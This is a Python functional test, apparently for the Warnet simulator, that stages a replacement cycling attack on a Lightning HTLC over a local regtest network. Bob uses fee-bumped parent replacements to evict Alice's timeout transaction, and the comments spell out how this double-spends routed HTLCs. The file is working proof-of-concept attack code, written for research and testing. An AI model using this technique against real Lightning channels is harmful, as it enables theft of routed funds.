#!/usr/bin/env python3
# Copyright (c) 2023 The Bitcoin Core developers
# Distributed under the MIT software license, see the accompanying
# file COPYING or http://www.opensource.org/licenses/mit-license.php.
#
# https://github.com/ariard/bitcoin/blob/30f5d5b270e4ff195e8dcb9ef6b7ddcc5f6a1bf2/test/functional/mempool_replacement_cycling.py#L5


"""Test replacement cycling attacks against Lightning channels"""

from test_framework.key import (
        ECKey
)

from test_framework.messages import (
        CTransaction,
        CTxIn,
        CTxInWitness,
        CTxOut,
        COutPoint,
        sha256,
        COIN,
        tx_from_hex,
)

from test_framework.util import (
        assert_equal
)

from test_framework.script import (
        CScript,
        hash160,
        OP_IF,
        OP_HASH160,
        OP_EQUAL,
        OP_ELSE,
        OP_ENDIF,
        OP_CHECKSIG,
        OP_SWAP,
        OP_SIZE,
        OP_NOTIF,
        OP_DROP,
        OP_CHECKMULTISIG,
        OP_EQUALVERIFY,
        OP_0,
        OP_2,
        OP_TRUE,
        SegwitV0SignatureHash,
        SIGHASH_ALL,
        SIGHASH_SINGLE,
        SIGHASH_ANYONECANPAY,
)

from warnet.test_framework_bridge import WarnetTestFramework

from test_framework.wallet import MiniWallet


def cli_help():
    return "Run a replacement cycling attack"

def get_funding_redeemscript(funder_pubkey, fundee_pubkey):
    return CScript([OP_2, funder_pubkey.get_bytes(), fundee_pubkey.get_bytes(), OP_2, OP_CHECKMULTISIG])

def get_anchor_single_key_redeemscript(pubkey):
    return CScript([pubkey.get_bytes(), OP_CHECKSIG])

def generate_funding_chan(wallet, coin, funder_pubkey, fundee_pubkey) -> CTransaction:
    witness_script = get_funding_redeemscript(funder_pubkey, fundee_pubkey)
    witness_program = sha256(witness_script)
    script_pubkey = CScript([OP_0, witness_program])

    funding_tx = CTransaction()
    funding_tx.vin.append(CTxIn(COutPoint(int(coin['txid'], 16), coin['vout']), b""))
    funding_tx.vout.append(CTxOut(int(49.99998 * COIN), script_pubkey))
    funding_tx.rehash()

    wallet.sign_tx(funding_tx)
    return funding_tx

def generate_parent_child_tx(wallet, coin, pubkey, sat_per_vbyte):
    # We build a junk parent transaction for the second-stage HTLC-preimage
    junk_parent_fee = 158 * sat_per_vbyte

    junk_script = CScript([OP_TRUE])
    junk_scriptpubkey = CScript([OP_0, sha256(junk_script)])

    junk_parent = CTransaction()
    junk_parent.vin.append(CTxIn(COutPoint(int(coin['txid'], 16), coin['vout']), b""))
    junk_parent.vout.append(CTxOut(int(49.99998 * COIN - junk_parent_fee), junk_scriptpubkey))

    wallet.sign_tx(junk_parent)
    junk_parent.rehash()

    child_tx_fee = 158 * sat_per_vbyte

    child_tx = CTransaction()
    child_tx.vin.append(CTxIn(COutPoint(int(junk_parent.hash, 16), 0), b"", 0))
    child_tx.vout.append(CTxOut(int(49.99998 * COIN - (junk_parent_fee + child_tx_fee)), junk_scriptpubkey))

    child_tx.wit.vtxinwit.append(CTxInWitness())
    child_tx.wit.vtxinwit[0].scriptWitness.stack = [junk_script]
    child_tx.rehash()

    return (junk_parent, child_tx)

def generate_preimage_tx(input_amount, sat_per_vbyte, funder_seckey, fundee_seckey, hashlock, commitment_tx, preimage_parent_tx):

    commitment_fee = 158 * 2 # Old sat per vbyte

    witness_script = CScript([fundee_seckey.get_pubkey().get_bytes(), OP_SWAP, OP_SIZE, 32,
        OP_EQUAL, OP_NOTIF, OP_DROP, 2, OP_SWAP, funder_seckey.get_pubkey().get_bytes(), 2, OP_CHECKMULTISIG, OP_ELSE,
        OP_HASH160, hashlock, OP_EQUALVERIFY, OP_CHECKSIG, OP_ENDIF])

    spend_script = CScript([OP_TRUE])
    spend_scriptpubkey = CScript([OP_0, sha256(spend_script)])

    preimage_fee = 148 * sat_per_vbyte
    receiver_preimage = CTransaction()
    receiver_preimage.vin.append(CTxIn(COutPoint(int(commitment_tx.hash, 16), 0), b"", 0))
    receiver_preimage.vin.append(CTxIn(COutPoint(int(preimage_parent_tx.hash, 16), 0), b"", 0))
    receiver_preimage.vout.append(CTxOut(int(2 * input_amount - (commitment_fee + preimage_fee * 3)), spend_scriptpubkey))

    sig_hash = SegwitV0SignatureHash(witness_script, receiver_preimage, 0, SIGHASH_ALL, commitment_tx.vout[0].nValue)
    fundee_sig = fundee_seckey.sign_ecdsa(sig_hash) + b'\x01'

    # Spend the commitment transaction HTLC output
    receiver_preimage.wit.vtxinwit.append(CTxInWitness())
    receiver_preimage.wit.vtxinwit[0].scriptWitness.stack = [fundee_sig, b'a' * 32, witness_script]

    # Spend the parent transaction OP_TRUE output
    junk_script = CScript([OP_TRUE])
    receiver_preimage.wit.vtxinwit.append(CTxInWitness())
    receiver_preimage.wit.vtxinwit[1].scriptWitness.stack = [junk_script]
    receiver_preimage.rehash()

    return (receiver_preimage)

def create_chan_state(funding_txid, funding_vout, funder_seckey, fundee_seckey, input_amount, input_script, sat_per_vbyte, timelock, hashlock, nSequence, preimage_parent_tx):
    witness_script = CScript([fundee_seckey.get_pubkey().get_bytes(), OP_SWAP, OP_SIZE, 32,
        OP_EQUAL, OP_NOTIF, OP_DROP, 2, OP_SWAP, funder_seckey.get_pubkey().get_bytes(), 2, OP_CHECKMULTISIG, OP_ELSE,
        OP_HASH160, hashlock, OP_EQUALVERIFY, OP_CHECKSIG, OP_ENDIF])
    witness_program = sha256(witness_script)
    script_pubkey = CScript([OP_0, witness_program])

    # Expected size = 158 vbyte
    commitment_fee = 158 * sat_per_vbyte
    commitment_tx = CTransaction()
    commitment_tx.vin.append(CTxIn(COutPoint(int(funding_txid, 16), funding_vout), b"", 0x1))
    commitment_tx.vout.append(CTxOut(int(input_amount - 158 * sat_per_vbyte), script_pubkey))

    sig_hash = SegwitV0SignatureHash(input_script, commitment_tx, 0, SIGHASH_ALL, int(input_amount))
    funder_sig = funder_seckey.sign_ecdsa(sig_hash) + b'\x01'
    fundee_sig = fundee_seckey.sign_ecdsa(sig_hash) + b'\x01'

    commitment_tx.wit.vtxinwit.append(CTxInWitness())
    commitment_tx.wit.vtxinwit[0].scriptWitness.stack = [b'', funder_sig, fundee_sig, input_script]
    commitment_tx.rehash()

    spend_script = CScript([OP_TRUE])
    spend_scriptpubkey = CScript([OP_0, sha256(spend_script)])

    timeout_fee = 158 * sat_per_vbyte
    offerer_timeout = CTransaction()
    offerer_timeout.vin.append(CTxIn(COutPoint(int(commitment_tx.hash, 16), 0), b"", nSequence))
    offerer_timeout.vout.append(CTxOut(int(input_amount - (commitment_fee + timeout_fee)), spend_scriptpubkey))
    offerer_timeout.nLockTime = timelock

    sig_hash = SegwitV0SignatureHash(witness_script, offerer_timeout, 0, SIGHASH_ALL, commitment_tx.vout[0].nValue)
    funder_sig = funder_seckey.sign_ecdsa(sig_hash) + b'\x01'
    fundee_sig = fundee_seckey.sign_ecdsa(sig_hash) + b'\x01'

    offerer_timeout.wit.vtxinwit.append(CTxInWitness())
    offerer_timeout.wit.vtxinwit[0].scriptWitness.stack = [b'', fundee_sig, funder_sig, b'', witness_script]
    offerer_timeout.rehash()

    preimage_fee = 148 * sat_per_vbyte
    receiver_preimage = CTransaction()
    receiver_preimage.vin.append(CTxIn(COutPoint(int(commitment_tx.hash, 16), 0), b"", 0))
    receiver_preimage.vin.append(CTxIn(COutPoint(int(preimage_parent_tx.hash, 16), 0), b"", 0))
    receiver_preimage.vout.append(CTxOut(int(2 * input_amount - (commitment_fee + preimage_fee * 3)), spend_scriptpubkey))

    sig_hash = SegwitV0SignatureHash(witness_script, receiver_preimage, 0, SIGHASH_ALL, commitment_tx.vout[0].nValue)
    fundee_sig = fundee_seckey.sign_ecdsa(sig_hash) + b'\x01'

    # Spend the commitment transaction HTLC output
    receiver_preimage.wit.vtxinwit.append(CTxInWitness())
    receiver_preimage.wit.vtxinwit[0].scriptWitness.stack = [fundee_sig, b'a' * 32, witness_script]

    # Spend the parent transaction OP_TRUE output
    junk_script = CScript([OP_TRUE])
    receiver_preimage.wit.vtxinwit.append(CTxInWitness())
    receiver_preimage.wit.vtxinwit[1].scriptWitness.stack = [junk_script]
    receiver_preimage.rehash()

    return (commitment_tx, offerer_timeout, receiver_preimage)


class ReplacementCyclingTest(WarnetTestFramework):

    def set_test_params(self):
        self.num_nodes = 2

    def test_replacement_cycling(self):
        alice = self.nodes[0]
        alice_seckey = ECKey()
        alice_seckey.generate(True)

        bob = self.nodes[1]
        bob_seckey = ECKey()
        bob_seckey.generate(True)

        self.generate(alice, 501)

        self.sync_all()

        self.connect_nodes(0, 1)

        coin_1 = self.wallet.get_utxo()

        wallet = self.wallet

        # Generate funding transaction opening channel between Alice and Bob.
        ab_funding_tx = generate_funding_chan(wallet, coin_1, alice_seckey.get_pubkey(), bob_seckey.get_pubkey())

        alice.log.info(f"A & B sign Funding Txn {ab_funding_tx.hash[0:7]}: Alice/Bob 2/2 multisig")

        # Propagate and confirm funding transaction.
        ab_funding_txid = alice.sendrawtransaction(hexstring=ab_funding_tx.serialize().hex(), maxfeerate=0)

        self.sync_all()

        assert ab_funding_txid in alice.getrawmempool()
        assert ab_funding_txid in bob.getrawmempool()
        alice.log.info(f"Funding Tnxn {ab_funding_txid[0:7]} is in the mempool: ")

        # We mine one block the Alice - Bob channel is opened.
        self.generate(alice, 1)
        assert_equal(len(alice.getrawmempool()), 0)
        assert_equal(len(bob.getrawmempool()), 0)

        lastblockhash = alice.getbestblockhash()
        block = alice.getblock(lastblockhash)
        lastblockheight = block['height']

        self.log.info(f"Alice sent funding Txn {ab_funding_txid[0:7]}, included @ {lastblockheight}")

        hashlock = hash160(b'a' * 32)

        funding_redeemscript = get_funding_redeemscript(alice_seckey.get_pubkey(), bob_seckey.get_pubkey())

        coin_2 = self.wallet.get_utxo()

        parent_seckey = ECKey()
        parent_seckey.generate(True)

        (bob_parent_tx, bob_child_tx) = generate_parent_child_tx(wallet, coin_2, parent_seckey.get_pubkey(), 1)

        self.log.info(f"Bob makes the Parent Txn ({bob_parent_tx.hash[0:7]}) "
                      f"& Child Txn ({bob_child_tx.hash[0:7]} using Coin_2.")

        (ab_commitment_tx, alice_timeout_tx, bob_preimage_tx) = create_chan_state(ab_funding_txid,
                                                                                  0,
                                                                                  alice_seckey,
                                                                                  bob_seckey,
                                                                                  49.99998 * COIN,
                                                                                  funding_redeemscript,
                                                                                  2,
                                                                                  lastblockheight + 20,
                                                                                  hashlock,
                                                                                  0x1,
                                                                                  bob_parent_tx)

        self.log.info(f"Funding Txn {ab_funding_txid[0:7]} -> A&B sign the Commitment Txn {ab_commitment_tx.hash[0:7]}"
                      ": A can claim w/ 2/2 multisig; B can claim with hashlock")
        self.log.info(f"Commitment Txn {ab_commitment_tx.hash[0:7]} -> A&B sign Timeout Txn "
                      f"{alice_timeout_tx.hash[0:7]}: After nLockTime, A claims with 2/2 multisig")
        self.log.info(f"Commitment Txn {ab_commitment_tx.hash[0:7]} -> Bob signs Preimage Txn "
                      f"{bob_preimage_tx.hash[0:7]}: Bob claims Commitment Txn w/ preimage + the Parent Txn")

        # We broadcast Alice - Bob commitment transaction.
        ab_commitment_txid = alice.sendrawtransaction(hexstring=ab_commitment_tx.serialize().hex(), maxfeerate=0)

        self.sync_all()

        assert ab_commitment_txid in alice.getrawmempool()
        assert ab_commitment_txid in bob.getrawmempool()
        self.log.info(f"Commitment Txn {ab_commitment_tx.hash[0:7]} in mempool")

        # Assuming anchor output channel, commitment transaction must be confirmed.
        # Additionally, we mine sufficient block for the alice timeout tx to be final.
        self.generate(alice, 20)
        assert_equal(len(alice.getrawmempool()), 0)
        assert_equal(len(bob.getrawmempool()), 0)

        lastblockhash = alice.getbestblockhash()
        block = alice.getblock(lastblockhash)
        blockheight_print = block['height']

        self.log.info(f"Alice broadcasted the Commitment Txn {ab_commitment_tx.hash[0:7]}" 
                      f"& mined 20 blocks; now @ {blockheight_print}")

        # Broadcast the Bob parent transaction and its child transaction
        bob_parent_txid = bob.sendrawtransaction(hexstring=bob_parent_tx.serialize().hex(), maxfeerate=0)
        bob_child_txid = bob.sendrawtransaction(hexstring=bob_child_tx.serialize().hex(), maxfeerate=0)

        self.log.info(f"Bob broadcasted the Parent Txn {bob_parent_txid[0:7]} & Child Txn {bob_child_txid[0:7]}" 
                      f" @ {blockheight_print}")

        self.sync_all()

        assert bob_parent_txid in alice.getrawmempool()
        assert bob_parent_txid in bob.getrawmempool()
        assert bob_child_txid in alice.getrawmempool()
        assert bob_child_txid in bob.getrawmempool()
        self.log.info(f"Parent Txn {bob_parent_txid[0:7]} is in mempool")
        self.log.info(f"Child Txn {bob_child_txid[0:7]} is in mempool")

        lastblockhash = alice.getbestblockhash()
        block = alice.getblock(lastblockhash)
        blockheight_print = block['height']

        # Broadcast the Alice timeout transaction
        alice_timeout_txid = alice.sendrawtransaction(hexstring=alice_timeout_tx.serialize().hex(), maxfeerate=0)
        self.log.info(f"Alice broadcasted her Timeout Txn {alice_timeout_txid[0:7]} @ {blockheight_print}")

        self.sync_all()

        assert alice_timeout_txid in alice.getrawmempool()
        assert alice_timeout_txid in bob.getrawmempool()
        self.log.info(f"Alice Timeout Txn {alice_timeout_txid[0:7]} is in the mempool")

        # Broadcast the Bob preimage transaction
        bob_preimage_txid = bob.sendrawtransaction(hexstring=bob_preimage_tx.serialize().hex(), maxfeerate=0)
        self.log.info(f"Bob broadcasted his Preimage Txn {bob_preimage_txid[0:7]} to kick Alice's Timeout Txn")

        self.sync_all()

        assert bob_preimage_txid in alice.getrawmempool()
        assert bob_preimage_txid in bob.getrawmempool()
        self.log.info(f"Bob's Preimage Txn {bob_preimage_txid[0:7]} is in the mempool; this kicks Alice's Timeeout Txn")

        # Check Alice timeout transaction and Bob child tx are not in the mempools anymore
        assert not alice_timeout_txid in alice.getrawmempool()
        assert not alice_timeout_txid in bob.getrawmempool()
        assert not bob_child_txid in alice.getrawmempool()
        assert not bob_child_txid in bob.getrawmempool()

        self.log.info(f"Alice's Timeout Txn {alice_timeout_txid[0:7]} and Bob's Child Txn {bob_child_txid[0:7]}"
                      f" are not in mempool @ {blockheight_print}")

        # Generate a higher fee parent transaction and broadcast it to replace Bob preimage tx
        (bob_replacement_parent_tx, bob_child_tx) = generate_parent_child_tx(wallet,
                                                                             coin_2, parent_seckey.get_pubkey(),
                                                                             10)

        bob_replacement_parent_txid = bob.sendrawtransaction(hexstring=bob_replacement_parent_tx.serialize().hex(),
                                                             maxfeerate=0)

        self.log.info(f"Bob makes Replacement Parent Txn {bob_replacement_parent_txid[0:7]}" 
                      f" (w/ higher fee) and broadcasts it @ {blockheight_print}")

        self.sync_all()

        # Check Bob HTLC preimage is not in the mempools anymore
        assert not bob_preimage_txid in alice.getrawmempool()
        assert not bob_preimage_txid in bob.getrawmempool()
        assert bob_replacement_parent_txid in alice.getrawmempool()
        assert bob_replacement_parent_txid in alice.getrawmempool()
        self.log.info(f"rawmempool: {alice.getrawmempool()}")

        # Check there is only 1 transaction (bob_replacement_parent_txid) in the mempools
        assert_equal(len(alice.getrawmempool()), 1)
        assert_equal(len(bob.getrawmempool()), 1)

        self.log.info(f"Bob's Preimage Txn not in mempool @ {blockheight_print}")
        self.log.info(f"Bob's Replacement Parent Txn is in mempool @ {blockheight_print}")

        # A block is mined and bob replacement parent should have confirms.
        self.generate(alice, 1)
        lastblockhash = alice.getbestblockhash()
        block = alice.getblock(lastblockhash)
        blockheight_print = block['height']

        assert_equal(len(alice.getrawmempool()), 0)
        assert_equal(len(bob.getrawmempool()), 0)

        self.log.info(f"Mined Bob's Replacement Parent Txn @ {blockheight_print}")

        # Alice can re-broadcast her HTLC-timeout as the offered output has not been claimed
        # Note the HTLC-timeout _txid_ must be modified to bypass p2p filters. Here we +1 the nSequence.
        (_, alice_timeout_tx_2, _) = create_chan_state(ab_funding_txid, 0, alice_seckey, bob_seckey, 49.99998 * COIN, funding_redeemscript, 2, lastblockheight + 20, hashlock, 0x2, bob_parent_tx)
        alice_timeout_txid_2 = alice.sendrawtransaction(hexstring=alice_timeout_tx_2.serialize().hex(), maxfeerate=0)

        self.sync_all()

        lastblockhash = alice.getbestblockhash()
        block = alice.getblock(lastblockhash)
        blockheight_print = block['height']

        self.log.info(
            f"Alice tweaks nSequence & re-broadcasts Timeout txn (output has not been claimed yet) @ {blockheight_print}")

        assert alice_timeout_txid_2 in alice.getrawmempool()
        assert alice_timeout_txid_2 in bob.getrawmempool()

        # Note all the transactions are re-generated to bypass p2p filters
        coin_3 = self.wallet.get_utxo()
        (bob_parent_tx_2, bob_child_tx_2) = generate_parent_child_tx(wallet, coin_3, parent_seckey.get_pubkey(), 4)
        bob_preimage_tx_2 = generate_preimage_tx(49.9998 * COIN, 4, alice_seckey, bob_seckey, hashlock, ab_commitment_tx, bob_parent_tx_2)

        self.log.info(
            f"Bob re-makes a Parent Txn & Child Txn (Coin_3) and a new Preimage Txn (spends Parent Txn) @ {blockheight_print}")

        bob_parent_txid_2 = bob.sendrawtransaction(hexstring=bob_parent_tx_2.serialize().hex(), maxfeerate=0)

        self.sync_all()

        self.log.info(
            f"Bob broadcasts Parent Txn @ {blockheight_print}")

        bob_child_txid_2 = bob.sendrawtransaction(hexstring=bob_child_tx_2.serialize().hex(), maxfeerate=0)

        self.sync_all()

        self.log.info(
            f"Bob broadcasts Child Txn @ {blockheight_print}")

        bob_preimage_txid_2 = bob.sendrawtransaction(hexstring=bob_preimage_tx_2.serialize().hex(), maxfeerate=0)

        self.sync_all()

        self.log.info(
            f"Bob broadcasts Preimage Txn @ {blockheight_print}")

        assert bob_preimage_txid_2 in alice.getrawmempool()
        assert bob_preimage_txid_2 in bob.getrawmempool()
        assert not alice_timeout_txid_2 in alice.getrawmempool()
        assert not alice_timeout_txid_2 in bob.getrawmempool()

        self.log.info(f"Bob's Preimage Txn is in the mempool; Alice's Timeout Txn is not @ {blockheight_print}")

        # Bob can repeat this replacement cycling trick until an inbound HTLC of Alice expires and double-spend her routed HTLCs.

        # ... but it gets mined immediately? - Greg
        self.generate(alice, 1)
        self.sync_all()

        assert bob_preimage_txid_2 not in alice.getrawmempool()
        assert bob_preimage_txid_2 not in bob.getrawmempool()


    def run_test(self):
        self.generatetoaddress(self.nodes[0], nblocks=101,
                               address="bcrt1p9yfmy5h72durp7zrhlw9lf7jpwjgvwdg0jr0lqmmjtgg83266lqsekaqka")

        self.wallet = MiniWallet(self.nodes[0])

        self.test_replacement_cycling()


if __name__ == '__main__':
    ReplacementCyclingTest().main()
